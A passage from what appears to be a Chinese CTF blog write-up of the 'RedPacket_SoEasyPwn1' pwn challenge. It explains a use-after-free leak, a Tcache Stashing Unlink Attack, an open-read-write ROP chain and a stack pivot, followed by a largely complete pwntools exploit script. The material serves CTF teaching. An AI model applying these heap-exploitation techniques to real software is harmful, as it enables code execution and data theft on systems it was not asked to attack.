class='item-img' data-src='https://img-blog.csdnimg.cn/c84cb045a70c47868706c89a5ffab3a4.png?ynotemdtimestamp=1663776368288'><img src="https://img-blog.csdnimg.cn/c84cb045a70c47868706c89a5ffab3a4.png?ynotemdtimestamp=1663776368288" alt="在这里插入图片描述"><br>此时我们利用UAF可以泄露出heap地址</p><figure class="highlight stylus"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><code class="hljs stylus"><span class="hljs-function"><span class="hljs-title">show</span><span class="hljs-params">(<span class="hljs-number">15</span>)</span></span><br>last_chunk_addr = <span class="hljs-built_in">u64</span>(<span class="hljs-built_in">ru</span>(<span class="hljs-string">'\x0A'</span>)<span class="hljs-selector-class">.strip</span>(<span class="hljs-string">'\x0A'</span>)<span class="hljs-selector-class">.ljust</span>(<span class="hljs-number">8</span>,<span class="hljs-string">'\x00'</span>))<br><span class="hljs-function"><span class="hljs-title">lg</span><span class="hljs-params">(<span class="hljs-string">'last_chunk_addr'</span>,last_chunk_addr)</span></span><br>heap_addr = last_chunk_addr - <span class="hljs-number">0</span>x26C0<br><span class="hljs-function"><span class="hljs-title">lg</span><span class="hljs-params">(<span class="hljs-string">'heap_addr'</span>,heap_addr)</span></span><br><span class="hljs-function"><span class="hljs-title">dbg</span><span class="hljs-params">()</span></span><br></code></pre></td></tr></tbody></table></figure><p class='item-img' data-src='https://img-blog.csdnimg.cn/58412fdbeaef4e3db7f7166362a15ab9.png?ynotemdtimestamp=1663776368288'><img src="https://img-blog.csdnimg.cn/58412fdbeaef4e3db7f7166362a15ab9.png?ynotemdtimestamp=1663776368288" alt="在这里插入图片描述"></p><h2 id="利用unsorted-bin构造两个small-bin-chunk"><a href="#利用unsorted-bin构造两个small-bin-chunk" class="headerlink" title="利用unsorted bin构造两个small bin chunk"></a>利用unsorted bin构造两个small bin chunk</h2><blockquote><p>当我们申请一个chunk时，如果unsorted bin里有chunk，而我们所申请的chunk大小小于unsorted bin里的chunk，那么就把unsorted bin的chunk分割，拿出我们需要的大小申请chunk，剩下的继续留在unsorted bin中，<br>而如果我们申请的chunk大小大于unsorted bin中的chunk，那么就会把unsorted bin中的chunk，按照大小放入对应的bin中，之后再从top chunk中申请一个chunk。</p></blockquote><p>我们可以先申请一个0x400大小的chunk，再申请一个0x300大小的chunk（防止合并），之后free 大小为0x400的chunk，再申请两次0x300大小的chunk，第一次申请的chunk会从0x400大小的chunk里切割出0x300，unsorted bin还剩0x100大小的chunk，第二次申请的chunk由于大于unsorted bin中的chunk，会将unsorted bin中的0x100大小的chunk放进small bin，我们利用同样的方法可以再次得到一个small bin的chunk，这样我们就得到了两个small bin chunk。</p><p>申请一个0x400大小的chunk，再申请一个0x300大小的chunk（防止合并），可以看到tcachebin中的chunk没有被拿走。</p><figure class="highlight stylus"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs stylus"><span class="hljs-function"><span class="hljs-title">add</span><span class="hljs-params">(<span class="hljs-number">1</span>,<span class="hljs-number">4</span>,<span class="hljs-string">'Chunk_1'</span>)</span></span><br><span class="hljs-function"><span class="hljs-title">add</span><span class="hljs-params">(<span class="hljs-number">13</span>,<span class="hljs-number">3</span>,<span class="hljs-string">'Chunk_13'</span>)</span></span><br><br><span class="hljs-function"><span class="hljs-title">dbg</span><span class="hljs-params">()</span></span><br></code></pre></td></tr></tbody></table></figure><p class='item-img' data-src='https://img-blog.csdnimg.cn/4bc407062a4647f0ab2256d8f7547c82.png?ynotemdtimestamp=1663776368288'><img src="https://img-blog.csdnimg.cn/4bc407062a4647f0ab2256d8f7547c82.png?ynotemdtimestamp=1663776368288" alt="在这里插入图片描述"><br>我们free chunk1，因为chunk1大小为0x400，tcachebin中0x400大小的chunk已满了7个，所以进入unsorted bin，利用UAF泄露libc基地址</p><figure class="highlight stylus"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs stylus"><span class="hljs-function"><span class="hljs-title">free</span><span class="hljs-params">(<span class="hljs-number">1</span>)</span></span><br><span class="hljs-function"><span class="hljs-title">show</span><span class="hljs-params">(<span class="hljs-number">1</span>)</span></span><br>libc_base = <span class="hljs-built_in">u64</span>(<span class="hljs-built_in">ru</span>(<span class="hljs-string">'\x0A'</span>)<span class="hljs-selector-class">.strip</span>(<span class="hljs-string">'\x0A'</span>)<span class="hljs-selector-class">.ljust</span>(<span class="hljs-number">8</span>,<span class="hljs-string">'\x00'</span>)) - <span class="hljs-number">0</span>x1E4CA0<br><span class="hljs-function"><span class="hljs-title">lg</span><span class="hljs-params">(<span class="hljs-string">'libc_base'</span>,libc_base)</span></span><br><span class="hljs-function"><span class="hljs-title">dbg</span><span class="hljs-params">()</span></span><br></code></pre></td></tr></tbody></table></figure><p class='item-img' data-src='https://img-blog.csdnimg.cn/6136120230264abc9181165746e485f1.png?ynotemdtimestamp=1663776368288'><img src="https://img-blog.csdnimg.cn/6136120230264abc9181165746e485f1.png?ynotemdtimestamp=1663776368288" alt="在这里插入图片描述"><br>申请0x300大小的chunk，在unsortedbin里寻找大小为0x300的chunk，分割unsortedbin 里的chunk，拿出0x300，还剩0x100</p><figure class="highlight stylus"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs stylus"><span class="hljs-function"><span class="hljs-title">add</span><span class="hljs-params">(<span class="hljs-number">13</span>,<span class="hljs-number">3</span>,<span class="hljs-string">'Chunk_13'</span>)</span></span><br><span class="hljs-function"><span class="hljs-title">dbg</span><span class="hljs-params">()</span></span><br></code></pre></td></tr></tbody></table></figure><p class='item-img' data-src='https://img-blog.csdnimg.cn/beb46b48f5e84c63bcd8d4825b23d04b.png?ynotemdtimestamp=1663776368288'><img src="https://img-blog.csdnimg.cn/beb46b48f5e84c63bcd8d4825b23d04b.png?ynotemdtimestamp=1663776368288" alt="在这里插入图片描述"></p><p>在unsortedbin里寻找大小为0x300的chunk，此时unsortedbin中chunk只有0x100大小，0x100的chunk进入smallbin，从top chunk中分配0x300大小的chunk，成功制造一个small bin chunk</p><figure class="highlight stylus"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs stylus"><span class="hljs-function"><span class="hljs-title">add</span><span class="hljs-params">(<span class="hljs-number">13</span>,<span class="hljs-number">3</span>,<span class="hljs-string">'Chunk_13'</span>)</span></span><br><br><span class="hljs-function"><span class="hljs-title">dbg</span><span class="hljs-params">()</span></span><br></code></pre></td></tr></tbody></table></figure><p class='item-img' data-src='https://img-blog.csdnimg.cn/e93cba834b9e405d828b6a1a0bbc1ea9.png?ynotemdtimestamp=1663776368288'><img src="https://img-blog.csdnimg.cn/e93cba834b9e405d828b6a1a0bbc1ea9.png?ynotemdtimestamp=1663776368288" alt="在这里插入图片描述"><br>利用同样方法再构造一个small bin chunk</p><figure class="highlight stylus"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><code class="hljs stylus"><span class="hljs-function"><span class="hljs-title">add</span><span class="hljs-params">(<span class="hljs-number">2</span>,<span class="hljs-number">4</span>,<span class="hljs-string">'Chunk_2'</span>)</span></span><br><span class="hljs-function"><span class="hljs-title">add</span><span class="hljs-params">(<span class="hljs-number">13</span>,<span class="hljs-number">4</span>,<span class="hljs-string">'Chunk_13'</span>)</span></span><br><br><span class="hljs-selector-id">#dbg</span>()<br><br><span class="hljs-function"><span class="hljs-title">free</span><span class="hljs-params">(<span class="hljs-number">2</span>)</span></span><br><br><span class="hljs-selector-id">#dbg</span>()<br><br><span class="hljs-function"><span class="hljs-title">add</span><span class="hljs-params">(<span class="hljs-number">13</span>,<span class="hljs-number">3</span>,<span class="hljs-string">'Chunk_13'</span>)</span></span><br><span class="hljs-function"><span class="hljs-title">add</span><span class="hljs-params">(<span class="hljs-number">13</span>,<span class="hljs-number">3</span>,<span class="hljs-string">'Chunk_13'</span>)</span></span><br><br><span class="hljs-function"><span class="hljs-title">dbg</span><span class="hljs-params">()</span></span><br></code></pre></td></tr></tbody></table></figure><p class='item-img' data-src='https://img-blog.csdnimg.cn/b555f84d5da64f6d800060cc087cc9f6.png?ynotemdtimestamp=1663776368288'><img src="https://img-blog.csdnimg.cn/b555f84d5da64f6d800060cc087cc9f6.png?ynotemdtimestamp=1663776368288" alt="在这里插入图片描述"></p><p>并借此我们找到size大小为0x1010的就是first_chunk，借此我们算出刚刚泄露出的heap+ 0x250+0x10+0x800-0x10就是first_chunk+0x800的地址，small bin chunk2的fd指针指向small bin chunk1不变，所以我们还要算出small bin chunk1距离heap的距离0x37e0</p><h2 id="修改small-bin-chunk的bk指针为first-chunk-0x800"><a href="#修改small-bin-chunk的bk指针为first-chunk-0x800" class="headerlink" title="修改small bin chunk的bk指针为first_chunk+0x800"></a>修改small bin chunk的bk指针为first_chunk+0x800</h2><figure class="highlight stylus"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs stylus">payload=<span class="hljs-string">'\x00'</span>*<span class="hljs-number">0</span>x300+<span class="hljs-built_in">p64</span>(<span class="hljs-number">0</span>)+<span class="hljs-built_in">p64</span>(<span class="hljs-number">0</span>x101)+<span class="hljs-built_in">p64</span>(heap_addr+<span class="hljs-number">0</span>x37E0)+<span class="hljs-built_in">p64</span>(heap_addr+<span class="hljs-number">0</span>x250+<span class="hljs-number">0</span>x10+<span class="hljs-number">0</span>x800-<span class="hljs-number">0</span>x10)<br><span class="hljs-function"><span class="hljs-title">edit</span><span class="hljs-params">(<span class="hljs-number">2</span>,payload)</span></span><br><span class="hljs-function"><span class="hljs-title">dbg</span><span class="hljs-params">()</span></span><br></code></pre></td></tr></tbody></table></figure><p class='item-img' data-src='https://img-blog.csdnimg.cn/0812f3a1c86243a681acb859b56aebbb.png?ynotemdtimestamp=1663776368288'><img src="https://img-blog.csdnimg.cn/0812f3a1c86243a681acb859b56aebbb.png?ynotemdtimestamp=1663776368288" alt="在这里插入图片描述"><br>再次申请0x100大小的chunk，程序仅会检查Chunk2的fd指针是否指向Chunk1，在取出Chunk1后，因为0x100的Tcache Bin还有1个空位，程序会遍历发现Chunk2满足大小条件并将其放入Tcache Bin中，我们若此时篡改Chunk2的bk指针指向first_chunk+0x800，触发Tcache Stashing Unlink Attack将main_arena+336写入first_chunk+0x800，满足first_chunk+0x800大于0x7F0000000000.</p><p class='item-img' data-src='https://img-blog.csdnimg.cn/c622ed9425cb4e63a1527f1b98668250.png?ynotemdtimestamp=1663776368288'><img src="https://img-blog.csdnimg.cn/c622ed9425cb4e63a1527f1b98668250.png?ynotemdtimestamp=1663776368288" alt="在这里插入图片描述"></p><h2 id="构造ORW的ROP链放入堆块中"><a href="#构造ORW的ROP链放入堆块中" class="headerlink" title="构造ORW的ROP链放入堆块中"></a>构造ORW的ROP链放入堆块中</h2><p>先获取一些gadget段， file_name_addr是我们要申请的下一个chunk的mem地址，也就是当前的top chunk的mem地址，距离heap 0x0000000000004A40</p><figure class="highlight ini"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><code class="hljs ini"><span class="hljs-attr">pop_rdi_ret</span> = libc_base + <span class="hljs-number">0</span>x0000000000026542<br><span class="hljs-attr">pop_rsi_ret</span> = libc_base + <span class="hljs-number">0</span>x0000000000026f9e<br><span class="hljs-attr">pop_rdx_ret</span> = libc_base + <span class="hljs-number">0</span>x000000000012bda6<br><span class="hljs-attr">file_name_addr</span> = heap_addr + <span class="hljs-number">0</span>x0000000000004A40 <span class="hljs-comment">#下一个chunk的mem位置起始位置</span><br><span class="hljs-attr">flag_addr</span> = file_name_addr + <span class="hljs-number">0</span>x0000000000000200 <span class="hljs-comment">#将flag写到file_name_addr + 0x0000000000000200处，防止覆盖掉有用内容</span><br><span class="hljs-attr">ROP_chain</span>  = <span class="hljs-string">'/flag\x00\x00\x00'</span><br></code></pre></td></tr></tbody></table></figure><p>open(file_name_addr,0)</p><figure class="highlight stylus"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs stylus">ROP_chain += <span class="hljs-built_in">p64</span>(pop_rdi_ret)<br>ROP_chain += <span class="hljs-built_in">p64</span>(file_name_addr)<br>ROP_chain += <span class="hljs-built_in">p64</span>(pop_rsi_ret)<br>ROP_chain += <span class="hljs-built_in">p64</span>(<span class="hljs-number">0</span>)<br>ROP_chain += <span class="hljs-built_in">p64</span>(libc_base+libc<span class="hljs-selector-class">.symbols</span><span class="hljs-selector-attr">[<span class="hljs-string">'open'</span>]</span>)<br></code></pre></td></tr></tbody></table></figure><p>read(3,flag_addr,0x40)<br>Read函数的第一个参数文件描述符从0开始累加，<br>程序进行时内核会自动打开3个文件描述符，0，1，2，分别对应，标准输入、输出和出错，<br>这样在程序中，每打开一个文件，文件描述符值从3开始累加。<br>我们打开了一个file_name_addr文件，文件描述符就变为了3，3就代表了file_name_addr文件<br>read函数第一个参数是3，就是在这个文件里读取数据。</p><figure class="highlight stylus"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><code class="hljs stylus">ROP_chain += <span class="hljs-built_in">p64</span>(pop_rdi_ret)<br>ROP_chain += <span class="hljs-built_in">p64</span>(<span class="hljs-number">3</span>)<br>ROP_chain += <span class="hljs-built_in">p64</span>(pop_rsi_ret)<br>ROP_chain += <span class="hljs-built_in">p64</span>(flag_addr)<br>ROP_chain += <span class="hljs-built_in">p64</span>(pop_rdx_ret)<br>ROP_chain += <span class="hljs-built_in">p64</span>(<span class="hljs-number">0</span>x40)<br>ROP_chain += <span class="hljs-built_in">p64</span>(libc_base+libc<span class="hljs-selector-class">.symbols</span><span class="hljs-selector-attr">[<span class="hljs-string">'read'</span>]</span>)<br></code></pre></td></tr></tbody></table></figure><p>write(1,flag_addr,0x40)</p><figure class="highlight stylus"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><code class="hljs stylus">ROP_chain += <span class="hljs-built_in">p64</span>(pop_rdi_ret)<br>ROP_chain += <span class="hljs-built_in">p64</span>(<span class="hljs-number">1</span>)<br>ROP_chain += <span class="hljs-built_in">p64</span>(pop_rsi_ret)<br>ROP_chain += <span class="hljs-built_in">p64</span>(flag_addr)<br>ROP_chain += <span class="hljs-built_in">p64</span>(pop_rdx_ret)<br>ROP_chain += <span class="hljs-built_in">p64</span>(<span class="hljs-number">0</span>x40)<br>ROP_chain += <span class="hljs-built_in">p64</span>(libc_base+libc<span class="hljs-selector-class">.symbols</span><span class="hljs-selector-attr">[<span class="hljs-string">'write'</span>]</span>)<br></code></pre></td></tr></tbody></table></figure><p>申请chunk，将ROP链写到chunk里</p><figure class="highlight stylus"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs stylus"><span class="hljs-function"><span class="hljs-title">add</span><span class="hljs-params">(<span class="hljs-number">4</span>,<span class="hljs-number">4</span>,ROP_chain)</span></span><br><br><span class="hljs-function"><span class="hljs-title">dbg</span><span class="hljs-params">()</span></span><br></code></pre></td></tr></tbody></table></figure><p class='item-img' data-src='https://img-blog.csdnimg.cn/b613b47921cb452786368b3e600ad61f.png?ynotemdtimestamp=1663776368288'><img src="https://img-blog.csdnimg.cn/b613b47921cb452786368b3e600ad61f.png?ynotemdtimestamp=1663776368288" alt="在这里插入图片描述"></p><h2 id="栈迁移"><a href="#栈迁移" class="headerlink" title="栈迁移"></a>栈迁移</h2><p>利用read(0, buf, 0x90uLL);buf0x80字节，正好可以溢出0x10字节，进行栈迁移，将程序迁移到我们最新申请的chunk处执行我们的ROP链。<br class='item-img' data-src='https://img-blog.csdnimg.cn/a332540cc3894122be74f0675a766eff.png?ynotemdtimestamp=1663776368288'><img src="https://img-blog.csdnimg.cn/a332540cc3894122be74f0675a766eff.png?ynotemdtimestamp=1663776368288" alt="在这里插入图片描述"></p><figure class="highlight stylus"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><code class="hljs stylus">leave_ret = libc_base + <span class="hljs-number">0</span>x0000000000058373<br><span class="hljs-function"><span class="hljs-title">ru</span><span class="hljs-params">(<span class="hljs-string">'Your input: '</span>)</span></span><br><span class="hljs-function"><span class="hljs-title">sl</span><span class="hljs-params">(<span class="hljs-string">'666'</span>)</span></span><br><span class="hljs-function"><span class="hljs-title">ru</span><span class="hljs-params">(<span class="hljs-string">'What do you want to say?'</span>)</span></span><br>#栈迁移<br><span class="hljs-function"><span class="hljs-title">sl</span><span class="hljs-params">(<span class="hljs-string">'A'</span>*<span class="hljs-number">0</span>x80 + p64(file_name_addr)</span></span> + <span class="hljs-built_in">p64</span>(leave_ret))<br><br><span class="hljs-function"><span class="hljs-title">itr</span><span class="hljs-params">()</span></span><br></code></pre></td></tr></tbody></table></figure><h2 id="exp"><a href="#exp" class="headerlink" title="exp"></a>exp</h2><figure class="highlight routeros"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br><span class="line">135</span><br><span class="line">136</span><br><span class="line">137</span><br><span class="line">138</span><br><span class="line">139</span><br><span class="line">140</span><br><span class="line">141</span><br><span class="line">142</span><br><span class="line">143</span><br><span class="line">144</span><br><span class="line">145</span><br><span class="line">146</span><br><span class="line">147</span><br><span class="line">148</span><br><span class="line">149</span><br><span class="line">150</span><br><span class="line">151</span><br><span class="line">152</span><br><span class="line">153</span><br><span class="line">154</span><br><span class="line">155</span><br><span class="line">156</span><br><span class="line">157</span><br><span class="line">158</span><br><span class="line">159</span><br><span class="line">160</span><br><span class="line">161</span><br><span class="line">162</span><br><span class="line">163</span><br><span class="line">164</span><br><span class="line">165</span><br><span class="line">166</span><br><span class="line">167</span><br><span class="line">168</span><br><span class="line">169</span><br><span class="line">170</span><br><span class="line">171</span><br><span class="line">172</span><br><span class="line">173</span><br><span class="line">174</span><br><span class="line">175</span><br><span class="line">176</span><br><span class="line">177</span><br><span class="line">178</span><br><span class="line">179</span><br><span class="line">180</span><br></pre></td><td class="code"><pre><code class="hljs routeros"><span class="hljs-comment"># coding=utf-8</span><br><span class="hljs-keyword">from</span> pwn import *<br>context(<span class="hljs-attribute">endian</span>=<span class="hljs-string">'little'</span>,os='linux',arch='amd64',log_level='debug') <br><br>sh = process(<span class="hljs-string">'./RedPacket_SoEasyPwn1'</span>)<br><span class="hljs-comment">#sh = remote('node4.buuoj.cn','27283')</span><br><br><span class="hljs-attribute">libc</span>=ELF("./libc-2.29.so")<br><br> <br> <br><br>s       = lambda data               :sh.send(data)<br>sa      = lambda delim,data         :sh.sendafter(delim, data)<br>sl      = lambda data               :sh.sendline(data)<br>sla     = lambda delim,data         :sh.sendlineafter(delim, data)<br>r       = lambda <span class="hljs-attribute">num</span>=4096           :sh.recv(num)<br>ru      = lambda delims    :sh.recvuntil(delims)<br>itr     = lambda                    :sh.interactive()<br>uu32    = lambda data               :u32(data.ljust(4,<span class="hljs-string">'\0'</span>))<br>uu64    = lambda data               :u64(data.ljust(8,<span class="hljs-string">'\0'</span>))<br>leak    = lambda name,addr          <span class="hljs-keyword">:log</span>.success(<span class="hljs-string">'{} = {:#x}'</span>.format(name, addr))<br>lg      = lambda address,data       <span class="hljs-keyword">:log</span>.success(<span class="hljs-string">'%s: '</span>%(address)+hex(data))<br>def dbg():<br>        gdb.attach(sh)<br>        pause()<br> <br><br>def <span class="hljs-built_in">add</span>(index,chunk_size_index,value):<br>    ru(<span class="hljs-string">'Your input: '</span>)<br>    sl(<span class="hljs-string">'1'</span>)<br>    ru(<span class="hljs-string">'Please input the red packet idx: '</span>)<br>    sl(str(index))<br>    ru(<span class="hljs-string">'How much do you want?(1.0x10 2.0xf0 3.0x300 4.0x400): '</span>)<br>    sl(str(chunk_size_index))<br>    ru(<span class="hljs-string">'Please input content: '</span>)<br>    sl(value)<br><br>def free(index):<br>    ru(<span class="hljs-string">'Your input: '</span>)<br>    sl(<span class="hljs-string">'2'</span>)<br>    ru(<span class="hljs-string">'Please input the red packet idx: '</span>)<br>    sl(str(index))<br><br>def <span class="hljs-built_in">edit</span>(index,value):<br>    ru(<span class="hljs-string">'Your input: '</span>)<br>    sl(<span class="hljs-string">'3'</span>)<br>    ru(<span class="hljs-string">'Please input the red packet idx: '</span>)<br>    sl(str(index))<br>    ru(<span class="hljs-string">'Please input content: '</span>)<br>    sl(value)<br><br>def show(index):<br>    ru(<span class="hljs-string">'Your input: '</span>)<br>    sl(<span class="hljs-string">'4'</span>)<br>    ru(<span class="hljs-string">'Please input the red packet idx: '</span>)<br>    sl(str(index))<br><br><br> <br><br><span class="hljs-comment">#1.0x10 2.0xf0 3.0x300 4.0x400</span><br><span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> range(7):<br>    <span class="hljs-built_in">add</span>(15,4,<span class="hljs-string">'Chunk_15'</span>)<br>    free(15)<br><br><br><br><span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> range(6):<br>    <span class="hljs-built_in">add</span>(14,2,<span class="hljs-string">'Chunk_14'</span>)<br>    free(14)<br><br><span class="hljs-comment">#dbg()</span><br><br>show(15)<br>last_chunk_addr = u64(ru(<span class="hljs-string">'\x0A'</span>).strip(<span class="hljs-string">'\x0A'</span>).ljust(8,<span class="hljs-string">'\x00'</span>))<br>lg(<span class="hljs-string">'last_chunk_addr'</span>,last_chunk_addr)<br>heap_addr = last_chunk_addr - 0x26C0<br>lg(<span class="hljs-string">'heap_addr'</span>,heap_addr)<br><br><span class="hljs-comment">#dbg()</span><br><br><span class="hljs-built_in">add</span>(1,4,<span class="hljs-string">'Chunk_1'</span>)<br><span class="hljs-built_in">add</span>(13,3,<span class="hljs-string">'Chunk_13'</span>)<br><br><span class="hljs-comment">#dbg()</span><br><br>free(1)<br>show(1)<br>libc_base = u64(ru(<span class="hljs-string">'\x0A'</span>).strip(<span class="hljs-string">'\x0A'</span>).ljust(8,<span class="hljs-string">'\x00'</span>)) - 0x1E4CA0<br>lg(<span class="hljs-string">'libc_base'</span>,libc_base)<br><br><br><span class="hljs-comment">#dbg()</span><br><br><span class="hljs-comment">#在unsortedbin里寻找大小为0x300的chunk，分割unsortedbin 里的chunk，拿出0x300，还剩0x100</span><br><span class="hljs-built_in">add</span>(13,3,<span class="hljs-string">'Chunk_13'</span>)<br><br><br><span class="hljs-comment">#dbg()</span><br><br><span class="hljs-comment">#在unsortedbin里寻找大小为0x300的chunk，此时unsortedbin中chunk只有0x100大小，0x100的chunk进入smallbin，从top chunk中分配0x300大小的chunk</span><br><span class="hljs-built_in">add</span>(13,3,<span class="hljs-string">'Chunk_13'</span>)<br><br><span class="hljs-comment">#dbg()</span><br><br><span class="hljs-comment">#在申请一个0x400大小的chunk，再制造一个0x100的smallbin的chunk</span><br><span class="hljs-built_in">add</span>(2,4,<span class="hljs-string">'Chunk_2'</span>)<br><span class="hljs-comment">#申请一个chunk防止合并</span><br><span class="hljs-built_in">add</span>(13,4,<span class="hljs-string">'Chunk_13'</span>)<br><br><span class="hljs-comment">#dbg()</span><br><br>free(2)<br><br><span class="hljs-comment">#dbg()</span><br><br><span class="hljs-built_in">add</span>(13,3,<span class="hljs-string">'Chunk_13'</span>)<br><span class="hljs-built_in">add</span>(13,3,<span class="hljs-string">'Chunk_13'</span>)<br><br><span class="hljs-comment">#dbg()</span><br><br><span class="hljs-attribute">payload</span>=<span class="hljs-string">'\x00'</span>*0x300+p64(0)+p64(0x101)+p64(heap_addr+0x37E0)+p64(heap_addr+0x250+0x10+0x800-0x10)<br><span class="hljs-built_in">edit</span>(2,payload)<br><br><span class="hljs-comment">#dbg()</span><br><br><span class="hljs-built_in">add</span>(3,2,<span class="hljs-string">'Chunk_3'</span>)<br>lg(<span class="hljs-string">'heap_addr'</span>,heap_addr)<br><br><span class="hljs-comment">#dbg()</span><br><br><span class="hljs-comment">#ORW</span><br>pop_rdi_ret = libc_base + 0x0000000000026542<br>pop_rsi_ret = libc_base + 0x0000000000026f9e<br>pop_rdx_ret = libc_base + 0x000000000012bda6<br>file_name_addr = heap_addr + 0x0000000000004A40 #下一个chunk的mem位置起始位置<br>flag_addr = file_name_addr + 0x0000000000000200 #将flag写到file_name_addr + 0x0000000000000200处，防止覆盖掉有用内容<br>ROP_chain  = <span class="hljs-string">'/flag\x00\x00\x00'</span><br><span class="hljs-comment">#open(file_name_addr,0)</span><br>ROP_chain += p64(pop_rdi_ret)<br>ROP_chain += p64(file_name_addr)<br>ROP_chain += p64(pop_rsi_ret)<br>ROP_chain += p64(0)<br>ROP_chain += p64(libc_base+libc.symbols[<span class="hljs-string">'open'</span>])<br><span class="hljs-comment">#read(3,flag_addr,0x40)</span><br><span class="hljs-comment">#Read函数的第一个参数文件描述符从0开始累加，</span><br><span class="hljs-comment">#程序进行时内核会自动打开3个文件描述符，0，1，2，分别对应，标准输入、输出和出错，</span><br><span class="hljs-comment">#这样在程序中，每打开一个文件，文件描述符值从3开始累加。</span><br><span class="hljs-comment">#我们打开了一个file_name_addr文件，文件描述符就变为了3，3就代表了file_name_addr文件</span><br><span class="hljs-comment">#read函数第一个参数是3，就是在这个文件里读取数据。</span><br>ROP_chain += p64(pop_rdi_ret)<br>ROP_chain += p64(3)<br>ROP_chain += p64(pop_rsi_ret)<br>ROP_chain += p64(flag_addr)<br>ROP_chain += p64(pop_rdx_ret)<br>ROP_chain += p64(0x40)<br>ROP_chain += p64(libc_base+libc.symbols[<span class="hljs-string">'read'</span>])<br><span 